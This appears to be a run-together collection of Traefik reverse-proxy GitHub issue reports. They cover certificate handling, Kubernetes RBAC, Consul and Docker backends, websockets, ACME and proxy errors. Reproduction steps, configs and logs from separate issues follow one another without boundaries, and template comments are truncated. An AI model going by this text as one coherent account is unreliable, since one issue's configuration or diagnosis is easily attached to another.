#l183
i'm using the traefik docker image
i configured and run it, and immediately the certificates are rejected _only when mixing wildcard domains_.
update from 1.5 to 1.6.2, the basic auth from my service doesn't work anymore.
<!-- - if possible, use the command `traefik bug`
see
after a change of config i noticed the client no longer gets an accepted certificate
switching back to the previously working config didn't solve the problem, neither did downgrading to 1.6.2 or 1.6.1..
<!-- - if possible, use the command `traefik bug`
see
- setup a kubernetes cluster with **ipv6 only**.
- follow the [traefik user guide on kubernetes]( - deploy traefik with rbac - deploy a simple http service - create an ingress resource object for this service <!-- - if possible, use the command `traefik bug`
see
create a frontend with large number of whitelisted source range, like: ```
services: foo: image: foo/bar restart: always labels: - "traefik.enable=true" - "traefik.port=80" - "traefik.website.frontend.priority=1" - "traefik.website.frontend.rule=host:foo.demo.com" - "traefik.website.frontend.whitelist.sourcerange=100.100.100.10/32,100.100.100.20/32,100.100.100.30/32,100.100.100.40/32,100.100.100.50/32,100.100.100.60/32,100.100.100.70/32,100.100.100.80/32,100.100.100.90/32" - "traefik.webhook.frontend.priority=10" - "traefik.website.frontend.rule=host:bar.demo.com" - "traefik.webhook.frontend.whitelist.sourcerange=0.0.0.0/0"
update to traefik 1.6.2 from 1.5.4
created traefik ingress controller via helm/stable/traefik
i installed default/cheese ingress
traefik errored at accessing its secrets.
error configuring tls for ingress default/cheese: secret default/traefik-cert does not exist
``` unfortunately, it shows error while accessing the secrets.
$ kubectl get secret dex-tls -oyaml --as gem-lb-traefik
error from server (forbidden): secrets "dex-tls" is forbidden: user "gem-lb-traefik" cannot get secrets in the namespace "default"
$ kubectl describe clusterrolebinding gem-lb-traefik
name: gem-lb-traefik
labels: <none>
annotations: <none>
role: kind: clusterrole name: gem-lb-traefik
subjects: kind name namespace ---- ---- --------- serviceaccount gem-lb-traefik default
$ kubectl describe clusterrole gem-lb-traefik
name: gem-lb-traefik
labels: <none>
annotations: <none>
policyrule: resources non-resource urls resource names verbs --------- ----------------- -------------- ----- endpoints [] [] [get list watch] pods [] [] [get list watch] secrets [] [] [get list watch] services [] [] [get list watch] ingresses.extensions [] [] [get list watch]
kubectl auth can-i get secrets --namespace default --as system:serviceaccount:default:gem-lb-traefik
``` discussion on slack channel below:
traefik deployment:
/ kubectl get deployment gem-lb-traefik -oyaml ```yml
apiversion: extensions/v1beta1
kind: deployment
metadata: annotations: deployment.kubernetes.io/revision: "1" creationtimestamp: 2018-05-28t10:13:59z generation: 1 labels: app: traefik chart: traefik-1.31.1 heritage: tiller release: gem-lb name: gem-lb-traefik namespace: default resourceversion: "2861633" selflink: /apis/extensions/v1beta1/namespaces/default/deployments/gem-lb-traefik uid: d695eb90-625f-11e8-8747-dc4a3e6bd0d7
spec: progressdeadlineseconds: 600 replicas: 1 revisionhistorylimit: 10 selector: matchlabels: app: traefik release: gem-lb strategy: rollingupdate: maxsurge: 1 maxunavailable: 1 type: rollingupdate template: metadata: annotations: checksum/config: f89e10ab419c8f18994f55f7e8255175c845386c0d3adc7ac386e2bf024f4289 creationtimestamp: null labels: app: traefik chart: traefik-1.31.1 heritage: tiller release: gem-lb spec: containers: - args: - --configfile=/config/traefik.toml image: traefik:1.6.2 imagepullpolicy: ifnotpresent livenessprobe: failurethreshold: 3 initialdelayseconds: 10 periodseconds: 10 successthreshold: 1 tcpsocket: port: 80 timeoutseconds: 2 name: gem-lb-traefik ports: - containerport: 80 hostport: 80 name: http protocol: tcp - containerport: 8880 name: httpn protocol: tcp - containerport: 443 hostport: 443 name: https protocol: tcp - containerport: 8080 hostport: 8080 name: dash protocol: tcp readinessprobe: failurethreshold: 1 initialdelayseconds: 10 periodseconds: 10 successthreshold: 1 tcpsocket: port: 80 timeoutseconds: 2 resources: limits: cpu: 100m memory: 30mi requests: cpu: 100m memory: 20mi terminationmessagepath: /dev/termination-log terminationmessagepolicy: file volumemounts: - mountpath: /config name: config - mountpath: /ssl name: ssl dnspolicy: clusterfirst restartpolicy: always schedulername: default-scheduler securitycontext: {} serviceaccount: gem-lb-traefik serviceaccountname: gem-lb-traefik terminationgraceperiodseconds: 60 volumes: - configmap: defaultmode: 420 name: gem-lb-traefik name: config - name: ssl secret: defaultmode: 420 secretname: gem-lb-traefik-default-cert
status: availablereplicas: 1 conditions: - lasttransitiontime: 2018-05-28t10:13:59z lastupdatetime: 2018-05-28t10:13:59z message: deployment has minimum availability
reason: minimumreplicasavailable status: "true" type: available - lasttransitiontime: 2018-05-28t10:13:59z lastupdatetime: 2018-05-28t10:14:20z message: replicaset "gem-lb-traefik-54bc87db7b" has successfully progressed
reason: newreplicasetavailable status: "true" type: progressing observedgeneration: 1 readyreplicas: 1 replicas: 1 updatedreplicas: 1
i have a uwsgi service that is registered using a local consul agent with local health checks for the uwsgi service
when i stop the uwsgi service on a node, consul detects the node to be unhealthy for that service but traefik does not remove it from the backend list
taking the uwsgi service offline
- stop the uwsgi service
- consul detects unhealthy node
- traefik does not remove from the backend list taking the uwsgi service online
- start the uwsgi service
- consul detects the healthy node
- traefik does not add the node on the backend list <!-- - if possible, use the command `traefik bug`
see
upgraded from 1.5.3 to 1.6.1.
<!-- how to write a good issue? - if possible, use the command `traefik bug`
see
<!-- - if possible, use the command `traefik bug`
see
--> roll out traefik 1.6.1 in a kubernetes cluster with prometheus metrics scraping, using ingress resources for dynamic configuration.
i wanted to load balance a websocket service and have the sticky session enabled
each user open multiple websocket streams and they need to end up at the same place (not my code, not something we can change right now)
i use docker but i tried to configure manually the load balancing using a file with rules and i had the same result
i created a simple websocket echo server to easily test the feature
see configuration below.
backend runs on docker
when exposing the docker port and using it directly everything works
when the request is sent through traefik i get http 413: request entity too large
deploy a service (borkservice) to service fabric cluster with an invalid servicemanifest.xml ```xml
<statelessservicetype servicetypename="borkservicetype" useimplicithost="true"> <extensions> <extension name="traefik"> <labels xmlns=" "> <label key="traefik.frontend.rule.borkservice">pathprefixstrip: /bork</label> <label key="traefik.enable">true</label> <label key="traefik.frontend.entrypoints">["https","http"]</label> </labels> </extension> </extensions>
</statelessservicetype>
deploy another service (goodservice) to cluster with a valid servicemanifest.xml
deploy traefik to cluster
<!-- how to write a good issue? - if possible, use the command `traefik bug`
see
attempt to utilize the custom error pages with rancher that was introduced in 1.6
added the new labels to the rancher service
created a custom error pages container, added a host rule, confirmed that the error pages are browsable via that host rule url
browse to an known invalid url for the test service with the new custom error config.
setup traefik 1.6 in a 1.8 k8s cluster using helm with staging acme enabled.
when users have a static (or acme) wildcard certificate loaded on an entrypoint, and submit an ingress with a tls certificate with an exact subdomain match, traefik will "randomly" serve requests using either certificate.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
- format your messages to help the reader focus on what matters and understand the structure of your message, use markdown syntax
hub-flavored-markdown -->
i wanted to have the dashboard exposed on my default https entrypoint, with a custom path, as explained at " ", si i created a new .toml file as following:
[backends] [backends.traefik] [backends.traefik.servers.traefik] url = " " [frontends] [frontends.traefikapi] backend = "traefik" [frontends.traefikapi.routes.traefikapi] rule = "pathprefixstrip:/traefik"
- created external backend named "backend-nsk0-web0" in separate toml file
- created frontend named "new" in separate toml file
with jaeger tracing enabled, the backend url collected in "tags" is not correct
given a frontend/backend rule as such:
`host:apistuff.com;pathprefixstrip: /client/2` i'm getting the following:
entrypoint span tag: `http.url "/client/2/channel/flat"`
"forward" span tag: `http.url " "`
created a file backend with self-signed certificates
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
if you look at the below config, i am using both the file and consul-catalog backends
initially, i only had a single config file, `traefik.toml`
after upgrading from 1.5.3, i started getting the following error when traefik started up, and the file backend would not load:
level=error msg="error starting provider *file.provider: template: /etc/traefik.d/traefik.toml:261: function \\"gettag\\" not defined"
it seems like my call to `gettag` in my consul-catalog `frontendrule` was being picked up by the file backend
i was able to work around this by using a separate file for the content of the file backend, `rules.toml` <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
set ingress tls cert via traefik's kubernetes ingress tls support
unfortunately one of our guy installed a cert with the wrong format in the referenced secret
so instead of using the pem cert, a der (binary) file has been added to the secret (still base64 encoded as required by kubernetes secret).
deployed traefik 1.6 with docker backend into our swarm cluster
- start traefik as a container
- start some service in container
traefik recognizes the started service and i can use the service with traefik
- stop some service in container
traefik recognizes the stopped service
- wait a day
- start some service in container
traefik does not recognize the started service and the service is not available through traefik.
while we're [waiting for the official 1.6 docker image]( i downloaded a shiny new traefik 1.6 from `containous/traefik@sha256:74c7e144161a850b648e4a690ad6940c1ef152c7797787e56673c6352846e51c` ( #issuecomment-385984440) and started playing with the fresh dashboard
here\'s a css glitch that i\'m observing in firefox: <img width="981" alt="screen shot 2018-05-02 at 18 41 54" src=" "> context: <img width="1232" alt="screen shot 2018-05-02 at 18 42 51" src=" "> the same divs in chrome look a bit different, but styling is still glitchy: ![kapture 2018-05-02 at 18 48 58](
* use `traefik storeconfig` to store config in consul
* launch traefik with `--consul` to load config
i have a graphql api running on nodejs using apollo and express, with traefik in front
when proxying through traefik i get sporadic 502 responses that i have not been able to resolve
i does _never_ happen when i bypass the proxy and connect directly to the backend node server
i am running all tests locally on my dev machine
my first attempt to force the error was load testing with the [locust](locust.io) framework
however, even when sending large amounts of request through the proxy i was unable to replicate the error
it only happens when i use the frontend application in the browser
after reading [this]( oxy issue i started suspecting cancelled connections
i added a custom http header with a uuid to be able to trace all requests, which i print on the backend.
```js app.use((req, res, next) => { const id = req.headers['x-request-id']; if (id) { console.log(`request id: ${id}`); } next(); }); ``` then i also added the following event listener to the express server to [detect cancelled requests](
```js app.use((req, res, next) => { req.connection.on('close', () => { const id = req.headers['x-request-id']; console.log(`cancelled request ${id}`); }); next(); });
``` what i can see is that i _do_ get cancelled requests when running the application in the browser, and at some point i get a `502` response from traefik
and in the traefik log this is ```
debu[2018-04-26t13:43:51+02:00] vulcand/oxy/forward/http: round trip: code: 502, length: 11, duration: 66.352475ms ``` and the nodejs backend log looks something like this: ```
request id: 7455804b-490a-4361-98e5-43d12bf4aca8
request id: 737f8d9d-3300-461b-858b-07006582a937
post /graphql 200 83.542 ms - 310
post /graphql 200 16.441 ms - 682
request id: 096e0e39-90e6-475c-b8ad-0aa2dfd2e345
post /graphql 200 5.338 ms - 163
request id: 69f17cb2-cdf1-4db5-a9f5-08e46d795892
request id: 50d3aec6-5cda-4e8b-ac0e-a30a57fa94c9
post /graphql 200 58.596 ms - 310
post /graphql 200 15.526 ms - 682
request id: 1d051f3a-7d80-464b-b50f-6d8e733d1940
<------------- here i get the 502
cancelled request 2e0a8e14-9880-46e7-8e51-ad528d55a81d
cancelled request b9489e71-7fc5-4f1c-b30a-668aac4652f9
cancelled request 249c529c-b9cb-4b48-a491-8e38a7ee50d8
cancelled request a5be4a66-9d43-4e30-a92d-862b355399a0
cancelled request 3721fe71-fe18-4389-812a-a90cc2f4f0f1
cancelled request 71b74750-8078-471e-91b8-a8119e5db797
cancelled request 34fb6b91-9fa5-4d68-92da-c267089f5910
cancelled request 692770b1-61c3-49c2-8309-8e7be629dca1
cancelled request 05790579-8290-4787-a7b7-82596ad24520
cancelled request c8edcc39-30c7-4812-941c-a1899298acf7
cancelled request 2ba9e715-ab7c-48ee-9d35-b5609179de6e
cancelled request b34f4725-665f-4b27-b3e1-cefec20c2ade
cancelled request 04bd3718-f6aa-4318-a469-fa3e17f54a20
cancelled request 4aedc60c-269a-420c-b083-1ea8f2e3243e
cancelled request 25be7334-43f9-4135-9537-36b0e36e698c
cancelled request 47bc1f9f-55c7-4f31-9957-7f0ad4285314
cancelled request bae3237c-efc8-4831-8260-6edbcedef28f
cancelled request 54685ecb-4d34-4698-b956-d0602b74a2e4
cancelled request 965f6ff2-da91-423c-a8e4-c2f4252f25fc
cancelled request 95c77d5c-230d-4875-8b25-fc0673c8e595
cancelled request 01658960-4627-42f8-a496-d29408a9579b
cancelled request 38221ac3-47ed-42f2-a56e-31deacdbfd62
cancelled request e73bec6b-744c-47bc-b001-0d914f03e976
cancelled request 73fade75-a943-45df-8b21-f8c50a480170
cancelled request 02688ad9-e947-415f-b70c-3cda16c50cf2
cancelled request 5d7d26c2-8c69-4083-a2d3-f0e1ae23bd0f
cancelled request f81a0258-085d-462f-9fcb-8a8b47918d04
``` the failed request that gets a 502 response in the browser never reach the node server backend
i get a whole bunch of canceled request after the 502 occurs
these request ids have been successfully served by the nodejs application at an earlier point
the canceling of the request seem to indicate some kind of connection leak? or maybe just a sideffect of having chrome developer tools open? anyway i never get any error response when bypassing the traefik instance
as the [oxy issue]( describes, if i just could get some other response than 502 for cancelled requests i could handle this better on the client side.
configure a websocket server
configure traefik to front the websocket server
configure aws alb to front traefik
connect a websocket client to alb
kill the websocket client, noting that os sends tcp rst to alb.
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i am using traefik v1.6.0-rc6 version, deployed on ecs with traefik:1.6.0-rc6-alpine docker image
i'm applying the labels to one of my docker services like below (where 217.117.24.41 is my home ip address): ```
"traefik.backend": "whoami"
"traefik.enable": "true"
"traefik.frontend.rule": "host:whoami.myhost.com"
"traefik.frontend.whitelist.sourcerange": "217.117.24.41/32"
"traefik.frontend.whitelist.usexforwardedfor": "true"
i tried to browse our web application (odoo) behind traefik
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
enabled `metrics.prometheus`
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i brought up a docker stack, including traefik and configured the entrypoint as follows:
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls]
**note** that the tls configuration is left empty and let's encrypt is not used
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
expose services via consul service catalog.
one of services is websocket server
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
we have been using traefik in production for some months, and have been quite happy with it so far.
however, probably due to our increasing traffic, we have been experiencing more and more randomly distributed 500 errors, and given the absence of logs from our service side, we started to believe that the errors were coming from traefik
a solution for us may be to scale up our services or number of instances - maybe add up some traefik instances? - but before we do that we need to make sure we know where the problem comes from
we believe this issue might be related to #3054
the following (stress) test shows a way to reproduce the same behaviour
we setup a single-instance traefik with some frontends pointing to one another, and launch 10 concurrent requests posting a ~1m file
in our tests, this high number of concurrent requests yields a higher probability to trigger the 500 errors
$ docker-compose up -d
$ for i in $(seq 1 10) ; do (curl -x post -d@mario.png -s -o /dev/null -w "%{http_code} " localhost:80/20/19/18/17/16/15/14/13/12/11/10/9/8/7/6/5/4/3/2/1 &) ; done
- register service -> service comes available in traefik
- stop service -> service is gone from traefik
- start same service -> service is not available in traefik but alive in consul
- wait 5-20 minutes -> service is not available in traefik
- restart traefik -> service comes available in traefik
installed v1.6.4rc4 and turned on the influx metrics reporting
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
had an empty acme.json file, had this:
deploy a docker service with the following labels: ```yaml - traefik.frontend.rule=host:private.example.com - traefik.frontend.entrypoints=http,https - traefik.frontend.auth.basic=username:password - traefik.frontend.headers.sslredirect=true
i tried to load a swagger site which documents my web api and noticed that traefik manipulates the content-type http header in the response for various css files.
while invoking the same web request without traefik in the middle (going directly to the server) i noticed the difference in the mentioned header
#### request with traefik: ```
###request headers:
accept: text/css,*/*;q=0.1
accept-encoding: gzip, deflate
accept-language: en-us,en;q=0.5
cache-control: no-cache
connection: keep-alive
cookie: ai_user=fz4cs|2017-11-02t14:47:58.633z
host: localhost:5555
pragma: no-cache
referer:
user-agent: mozilla/5.0 (windows nt 10.0; win64; x64; rv:59.0) gecko/20100101 firefox/59.0
### response headers:
http/1.1 200 ok
##### content-type: text/plain; charset=utf-8
date: wed, 04 apr 2018 15:22:12 gmt
transfer-encoding: chunked
``` #### request without traefik:
```
### request headers:
accept: text/css,*/*;q=0.1
accept-encoding: gzip, deflate
accept-language: en-us,en;q=0.5
cache-control: no-cache
connection: keep-alive
cookie: ai_user=fz4cs|2017-11-02t14:47:58.633z
host: localhost:30020
pragma: no-cache
referer:
user-agent: mozilla/5.0 (windows nt 10.0; win64; x64; rv:59.0) gecko/20100101 firefox/59.0
### response headers:
http/1.1 200 ok
accept-ranges: bytes
content-length: 43644
##### content-type: text/css
date: wed, 04 apr 2018 15:23:42 gmt
etag: "24c85a5ed12703fc"
last-modified: fri, 31 dec 9999 23:59:59 gmt
server: microsoft-httpapi/2.0
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
deployed traefik with kubernetes backend, aiming to use certificates stored in kubernetes secrets
i launch a container with label
docker run --name test --label "traefik.frontend.rule=host:test.com" --label "traefik.enable=true" emilevauge/whoami
in #3073, support for containers with multiple ports was added for rancher and marathon using segment labels
i am using the latest rc 1.6.0-rc1, and am experiencing trouble getting it to work
there is a slight indirection involved in my usecase, which is that i am using traefik with this [dockerfile](
all i change is the `service_build` to `1.6.0-rc1` (essentially the same as `1.6.0-rc2` tag).
docker run -it --rm traefik:1.6 --acme
we did parallel requests against a service in our swarm - with a c# application and parallel foreach - when we set the parallelism to 3 we encounter several error 500
the same script works sending the request to the service directly - via exposed port on the servers it runs on
the url we request is a download url for files that are in average 2 mb big
the service itself does not answer with an error 500 but with the file contend and the status code 200.
clicked on the link in the "notes" section of #tls-communication-between-traefik-and-backend-pods
i have a backend with two servers:
[backends] [backends.service] [backends.service.servers.active] url = " " weight = 10000000 [backends.service.servers.passive] url = " " weight = 0
``` and a healthcheck defined like this:
```toml [backends.service.healthcheck] path = "/wd/hub/status" interval = "5s"
as soon as healtcheck for active server fails the "passive" server starts to get traffic.
so until now everything fine but as soon as active server is back again (healtcheck returns 200)
traefik starts round robin equally between active and passive
it does not honour the weights anymore.
adding a task to an existing aws ecs cluster using fargate will result in traefik.io throwing errors.
launched the official `traefik` image with the following `docker-compose` file:
services: traefik: container_name: traefik environment: cloudflare_email: "${email}" cloudflare_api_key: "${cloudflare_api_key}" image: traefik ports: - "80:80" - "8080:8080" - "443:443" restart: unless-stopped volumes: - "/var/run/docker.sock:/var/run/docker.sock:ro" - "${mount}/traefik:/etc/traefik" - "${mount}/certs:/etc/traefik/certs"
version: '3.3'
and launched `docker-compose up traefik`
we tried to start our setup using `docker-compose up`, but traefik didn't startup as expected
the same setup worked two weeks ago
in the meantime, a new kernel has been installed, but that shouldn't result in the below error, should it? we were pinned to `v1.5.0rc2` previously, tried a new container and also the newer `v1.5.2`, but same error there
the same `dockerfile` works fine on other systems.
i would like to use rest api to on-the-fly reconfiguration.
configure a frontend which has a custom error page handler
[frontends] [frontends.test1] backend = "test1" [frontends.test1.errors] [frontends.test1.errors.upstream] status = ["502-504"] backend = "errorhandler" query = "/{status}.html" [frontends.test1.routes.default] rule = "host:www.myapp.com"
``` make a http request to the new frontend (a valid one which won't trigger the error handler).
i looked for a comprehensive listing of configuration parameters and their meaning.
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
--> ```toml
[frontends] [frontends.frontend-specific] backend = "backend-specific" [frontends.frontend-specific.routes.route0] rule = "host:something.example.com" [frontends.frontend-fallback] backend = "backend-fallback" priority = -5000 [frontends.frontend-fallback.routes.anything] rule = "hostregexp:{anything:[\\\\da-z\\\\._\\\\-]+}"
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
--> i tried to start traefik with a invalid configuration path (the file does not exist).
i want to redirect a specific ingress from http to https in a kubernetes cluster
currently using v1.5.2 image
my ingress yaml is: ```yml
apiversion: extensions/v1beta1
kind: ingress
metadata: name: kubernetes-dashboard-external namespace: kube-system annotations: traefik.frontend.rule.type: pathprefix traefik.frontend.redirect.entrypoint: https ingress.kubernetes.io/auth-type: basic ingress.kubernetes.io/auth-secret: dashboard-auth
spec: rules: - host: dashboard.cloud.mydomain.com http: paths: - path: / backend: servicename: kubernetes-dashboard serviceport: 80
``` when i access the address, i get a "too many redirects" error
$ wget
--2018-02-24 16:10:44--
resolving dashboard.cloud.mydomain.com (dashboard.cloud.mydomain.com)..
190.219.173.145
connecting to dashboard.cloud.mydomain.com (dashboard.cloud.mydomain.com)|190.219.173.145|:80..
http request sent, awaiting response..
location: [following]
--2018-02-24 16:10:44--
connecting to dashboard.cloud.mydomain.com (dashboard.cloud.mydomain.com)|190.219.173.145|:443..
http request sent, awaiting response..
location: [following]
20 redirections exceeded.
configured traefik with as minimal configuration (using [file]-provider only) as possible, and testing two scenarios: 1
no acme, 3 wildcard certificates added using [[tls]]-method in [file]-provider
with acme, 3 wildcard certificates added using [[tls]]-method in [file]-provider same frontends/backends in both scenarios:
* api.duglemmerdetaldrig.dk
* api.truestory.no
* api.truestory.se wildcard certificate common names are:
* *.duglemmerdetaldrig.dk
* *.truestory.no
* *.truestory.se i then tried doing simple requests:
_note: i had my hosts-file set up to point the domains to 127.0.0.1 to test locally_
i am trying to connect to an mqtt broker backend through websocket port
the backend is tested
when i bypass traefik and connect to the backend directly through websocket-mqtt client, it works
the sec-websocket-protocol header is included in the response and connection can be established
plain websocket connection (without mqtt) also works through traefik without any problem
since in this case the client request doesn't include the sec-websocket-protocol header, the response doesn't have to include it anyway
this seems to be addressed in #1945
but i've tried v1.3.6, v1.4.0, v1.5.2, all show the same behavior
request header is as follows:
get ws://xx.xx.xx.xx/mqtt http/1.1
host: xx.xx.xx.xx
connection: upgrade
pragma: no-cache
cache-control: no-cache
upgrade: websocket
origin:
sec-websocket-version: 13
user-agent: mozilla/5.0 (windows nt 6.1; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.167 safari/537.36
accept-encoding: gzip, deflate
accept-language: de-de,de;q=0.9,en-us;q=0.8,en;q=0.7
sec-websocket-key: p2at3frcqf5llswmk8gdiw==
sec-websocket-extensions: permessage-deflate; client_max_window_bits
sec-websocket-protocol: mqttv3.1
<!-- how to write a good issue? - if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
activated the tracing for `containous/traefik:experimental`
config stored in kv.
@mafcocinco originally found this issue
with his help i think we have finally got the behavior nailed down
send a request with an `expect: 100-continue` header
this was done with `curl` (by default) when sending a large enough post
when we specified `-h 'expect:'` to disable the header, routing and functionality worked correctly.
added a tls certificate with a typo in the filename
i'm trying to load balance a gprc service written in c++
the service is very simple (comparable to hello world grpc sample), slightly modified to use tls and server side certificates (required by traefik)
without traefik everything works well.
configured 3 backends and 3 frontends - `/`, `/api` and `/wss`
the last one being websocket that, judging by the logs, is having issues connecting to it's backend.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i am running a docker container with dynamodb.
i am running a docker container with the alpine image of traefik 1.5.2 .
i configured traefik to use dynamodb as backend.
when i start traefik i get an error.
i tried changing the config documants in dynamodb.
when i remove the property `ratelimit.extractorfunc.rateset.rateset1.period` the error is gone.
when i change the type of the property to a number (`"10s"` --> `10`) there is an other error.
the example in the documentation uses `"10s"` --> #rate-limiting.
if i use the file backend everything works just fine.
open frontend url in browser.
i made a fresh ubuntu setup, applied the last updates(`apt-get update && apt dist-upgrade`): ```console
ubuntu@ubuntu-xenial:~$ lsb_release -a
no lsb modules are available.
distributor id: ubuntu
description: ubuntu 16.04.3 lts
release: 16.04
codename: xenial
ubuntu@ubuntu-xenial:~$ uname -a
linux ubuntu-xenial 4.4.0-38-generic #57-ubuntu smp tue sep 6 15:42:33 utc 2016 x86_64 x86_64 x86_64 gnu/linux
``` then i installed latest docker: ```bash
ubuntu@ubuntu-xenial:~$ docker --version
docker version 17.12.0-ce, build c97c6d6
``` and configured it to swarm mode: ```bash
sudo docker swarm init
``` started 4 instances of simple service: ```bash
sudo docker service create --name nginx \\ --endpoint-mode dnsrr \\ --label traefik.frontend.rule=host:test.test.nl \\ --label traefik.port=80 \\ nginx:alpine \\ && sudo docker service scale nginx=4
``` downloaded last traefik release binary - 1.5.2
made a config file: ```toml
debug = true
[entrypoints] [entrypoints.http] address = ":80" [docker]
endpoint = "unix:///var/run/docker.sock"
watch = true
swarmmode = true
``` then i run traefik: ```console
ubuntu@ubuntu-xenial:~$ sudo ./traefik_linux-amd64 -c traefik.toml
info[2018-02-16t10:23:10z] using toml configuration file /home/ubuntu/traefik.toml
info[2018-02-16t10:23:10z] traefik version v1.5.2 built on 2018-02-12_10:56:31am
i have a basic frontend-backend config
my frontend configuration uses passhostheader=true configuration.
in the following iis log from my container
- the first row, is when traefik is configure with a backend service url
- the second row, is when traefik is configure with a backend service url https:// ```
#fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port c-ip cs(referer) **cs-host** sc-status sc-substatus
2018-02-09 18:24:33 172.29.246.42 get /en-ca/services/tsprimarydata/getairports - 80 172.29.240.1 - **dev.my-business.com** 200 0
2018-02-09 18:29:42 172.29.246.42 get /en-ca/services/tsprimarydata/getairports - 80 172.29.240.1 - **172.29.246.42** 200 0
``` as you can see with the cs-host logged info in bold, the host is passed when backend is configured in http but not when it`s configured in https
i deployed traefik to google kubernetes engine and configured it as a ingress
i have a websocket backend which traefik is configured to forward connections to
when i use a desktop browser and an android phone browser to connect to this websocket connection, traefik manages to forwards it successfully
however, when i use a browser in iphone 7 to access this websocket connection, traefik fails to forward it.
we started using new compose feature called startup order
you need to define in docker-compose.yml
order: start-first
this feature looks very useful, but traefik becomes confused then and starts routing traffic to containers from different services, means you are requesting one web site, getting another
i am not sure if it is a traefik bug or docker itself, but when we delete this option from our compose files everything normalized immediately.
we use traefik on docker swarm to expose hundreds of distinct services
since docker swarm's overlay networks get slow with virtual ips on this scale we have set all the relevant services to `endpoint_mode: dns_rr`
see moby/moby#30820
we are aware that traefik does not (yet) support load balancing with dns rr on swarm
this is ok for us since our target services currently all have `scale: 1`
up until traefik 1.4.x this worked just fine.
create an ingress on kubernetes with this annotation:
`traefik.frontend.redirect.entrypoint: https`
update traefik to 1.5 with http challenge.
i have update traefik from 1.3.8 to 1.5.0.
during this update i didn't change the config file, because some site use commercial ssl files.
and with 1.5.0 is not working but in 1.3.8 is working with the 1.5.0 with got this error : ```
time="2018-01-25t11:10:32z" level=info msg="starting server on :8080" time="2018-01-25t11:10:32z" level=info msg="starting server on :80" time="2018-01-25t11:10:32z" level=error msg="error creating tls config: tls: private key does not match public key" time="2018-01-25t11:10:32z" level=fatal msg="error preparing server: tls: private key does not match public key"
``` at this step i tried to remove the ssl configuration with the 1.5.0 version and it's work
if a set again the ssl configuration is not working
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i am trying to fetch automatic certificates from let's encrypt with http-01.
i configured traefik to use letsencrypt and docker and tried to start it.
running in an environment that requires the use of corporate proxies for making outbound http connections
upgraded to traefik v1.5.0-rc5 and acme communication started failing ```json
"level":"error",
"msg":"error building acme client { email:gozer+haul@ectoplasm.org registration: privatekey:[ ...] lock:{w:{state:0 sema:0} writersem:0 readersem:0 readercount:0 readerwait:0} } challengecerts:map[] httpchallenge:map[]}: get directory at \' failed to get json \\" ": get dial tcp 23.33.254.132:443: getsockopt: connection refused","time":"2018-01-22t18:19:52z"}
pulled traefik:v1.5.0-rc5, re-created my traefik container (which was using v1.5.0-rc4) and observed the following issue whilst trying to connect to my [home-assistant]( container.
we have the need for new apps to be included within the same backend so that they are added
to the wrr pool of an existing app in order for zero downtime deployments
this was originally
working with traefik 1.4.0-rc1 and continued to work until 1.4.2
we didn't try to upgrade
until recently and we are pretty sure this template change caused the issue: #diff-080894c4c7f765921235ddb2ceb82140
when using traefik in front of dynamic web applications (e.g
nextcloud, speedtest) i see very high cpu usage up to 100%, when data is transferred (e.g
large downloads or speedtests)
note: traefik and web apps run both in docker swarm **update 1:** disable compression on entrypoint
cpu usage still at 50-60% - is this expected?
i launched traefik pod in kubernetes via deployment with etcd backend
the etcd kv has been pre-populated using kubernets job
if i increase the instance count to 2 in the deployment a new traefik pod is launched that trows the following error:
time="2018-01-07t05:11:19z" level=debug msg="building acme client..." time="2018-01-07t05:11:19z" level=error msg="error building acme client &{email: registration:<nil> privatekey:[] domainscertificate:{certs:[] lock:{w:{state:0 sema:0} writersem:0 readersem:0 readercount:0 readerwait:0}} challengecerts:map[]}: private key was nil"
``` i assume due to the `/traefik/acme/account/lock___lock` key created by the first one
now if i delete the first pod the lock does not get removed which means the acme settings stay unavailable for the second pod and the new one that the deployment will launch to replace the first one.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
traefik is running inside a docker swarm
access log is enabled.
consul catalog entry:
{ "service": { "name": "application-java", "tags": ["application-java", "env-subdomain", "traefik.tags=loadbalanced", "traefik.frontend.rule=host:subdomain.domain.com"], "address": "", "port": 8080, "enable_tag_override": false, "checks": [{ "http": " ", "interval": "10s" }] }
``` `onhostrule = true`
`ondemand = false`
configured a docker swarm backend that has service tasks running on another node than traefik
traefik is running on the single manager, backends are running on 1-2 worker nodes
used the `traefik bug` command to get the json config.
upgraded to 1.5.0-rc3 and then made a request.
